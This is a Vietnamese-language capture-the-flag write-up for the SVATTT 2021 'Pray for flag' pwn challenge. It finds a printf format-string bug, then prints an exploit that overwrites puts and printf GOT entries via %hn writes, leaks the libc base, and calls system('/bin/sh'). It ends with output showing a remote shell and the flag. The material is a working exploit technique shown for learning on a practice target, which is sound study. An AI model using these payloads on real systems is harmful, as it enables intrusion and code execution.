# PWN WRITE UP - Vòng khởi động svattt 2021
## 1. Pray for flag


Đầu tiên mình kiểm tra qua file bằng checksec 


```
[*] '/home/iluvinn/pwn/svattt/pray_for_flag/pwn1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Thấy có canary và nx enabled nên hướng làm có thể sẽ sử dụng format string. 
<br>
Chạy thử để xem file hoạt động ra sao <br>
```
## TEST 1 ##
iluvinn in ~/pwn/svattt/pray_for_flag λ ./pwn1
Welcome to the wishing central!
Tell me what you want and I will give it to you.
What do you want?
I_want_money      <=== USER INPUT
I_want_money      <=== OUTPUT
Bye
## TEST 2 ##
iluvinn in ~/pwn/svattt/pray_for_flag λ ./pwn1
Welcome to the wishing central!
Tell me what you want and I will give it to you.
What do you want?
%p.%p.%p                      <=== INPUT
0x100.0xf7f125c0.0x80485df    <=== OUTPUT 
Bye
```
Sure kèo có format string rồi :v 
<br>
Tiếp sau đấy mình dùng ida để decompile ra source code
```
void init()
{
  setbuf(stdout, 0);
  setbuf(stdin, 0);
  setbuf(stderr, 0);
}

unsigned int vuln()
{
  char s[256]; // [esp+Ch] [ebp-10Ch] BYREF
  unsigned int v2; // [esp+10Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);        <=== CANARY
  fgets(s, 256, stdin);
  printf(s);                        <=== FORMAT STRING VULN
  return __readgsdword(0x14u) ^ v2;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(&argc);
  puts("Welcome to the wishing central!");
  puts("Tell me what you want and I will give it to you.");
  puts("What do you want?");
  vuln();
  puts("Bye");
  return 0;
}
``` 

Mình nhận tháy là trong .plt không có hàm system vậy nên ý nghĩ ban đầu cần phải có libc base address, system offset và "/bin/sh" offset sau đó điều khiển luồng chương trình thực thi hàm system và gọi bash.
<br>
Ý tưởng của mình ở đây là overwrite địa chỉ của hàm puts khiến nó gọi lại hàm vuln để tạo 1 vòng loop. Sau đó overwrite hàm printf bằng system. Đến lần loop thứ 3 ta chỉ đơn giản là input chuỗi "/bin/sh"
<br>
Đầu tiên là leak stack để tìm libc base và tạo loop.

```
iluvinn in ~/pwn/svattt/pray_for_flag λ ./pwn1
Welcome to the wishing central!
Tell me what you want and I will give it to you.
What do you want?
AAAA%p.%p.%p.%p.%p.%p.%p.%p          
AAAA0x100.0xf7f165c0.0x80485df.0xf7f16d80.0x11.0x80487b1.0x41414141.0x252e7025    <=== write to parameter 7 on stack
Bye
----------------#   GDB   #--------------------------
main:
   0x0804868b <+82>:	add    esp,0x10
   0x0804868e <+85>:	call   0x80485d0 <vuln>  <==== overwirte puts@plt = 0x0804868e
   0x08048693 <+90>:	sub    esp,0xc
puts@plt:
   0x08048430 <+0>:	jmp    DWORD PTR ds:0x804a01c
   0x08048436 <+6>:	push   0x20
   0x0804843b <+11>:	jmp    0x80483e0

----------------# Exploit #--------------------------
   put =  0x804a01c
   arr = [0x868e,0x0804]          <==== address of "call   0x80485d0 <vuln>"
   exp = p32(put)+p32(put+2)      <==== put low and high address of "puts" into stack
   
   wr = arr[1]-8
   exp+="%"+str(wr)+"c%8$hn"      <==== write low addr with "%hn"
   wr = arr[0]-arr[1]
   exp+="%"+str(wr)+"c%7$hn"      <==== write high addr with "%hn"
   
   exp+="%2$p"                    <==== leak 1 addr in libc to calculate libc base address
   x = 0xf7edc5c0 - 0xf7d04000    <==== offset from 2nd parameter to libc base address
   
   p.recvuntil('want?\n')
   p.sendline(exp)                <==== send payload
   p.recvuntil('0x')
   libc_base =int("0x"+p.recv(8),16)-x  <=== leak 2nd parameter and calculate libc base address
   print "libc base: "+hex(libc_base)
```
Tiếp sau đó ta overwrite printf thành system
```
------------------------------------------
iluvinn in ~/pwn/svattt/pray_for_flag λ readelf -s libc-2.27.so | grep system
   254: 00129530   102 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   652: 0003d2e0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1510: 0003d2e0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0              <==== system offset
--------------# GDB #---------------------
pr = 0x804a010                  <==== printf@plt addr

sys_offset = 0x003d2e0
sys_got=libc_base+sys_offset
sys_got = str(hex(sys_got))
arr = [int("0x"+sys_got[6:],16),int(sys_got[:6],16)]

exp = p32(pr)+p32(pr+2)         
xx = arr[0]-8
exp+="%"+str(xx)+"c%7$hn"
xx = arr[1]-arr[0]
exp+="%"+str(xx)+"c%8$hn"

p.sendline(exp)
p.sendline("/bin/sh")     <==== send "/bin/sh" string so it will call system("/bin/sh") instead of printf("/bin/sh")
p.interactive()
```
Chạy file [exploit](https://github.com/yuumi001/write-up/blob/main/svattt/exp.py) hoy
```
iluvinn in ~/pwn/svattt/pray_for_flag λ python exp.py
[+] Opening connection to 134.209.97.157 on port 2222: Done
libc base: 0xf7daa000
[*] Switching to interactive mode
$ id
uid=1000(noob) gid=1000(noob) groups=1000(noob)
$ cat fl*
ptitctf{B3_C4RFUL_WH47_Y0U_W15H_F0R}
$
```
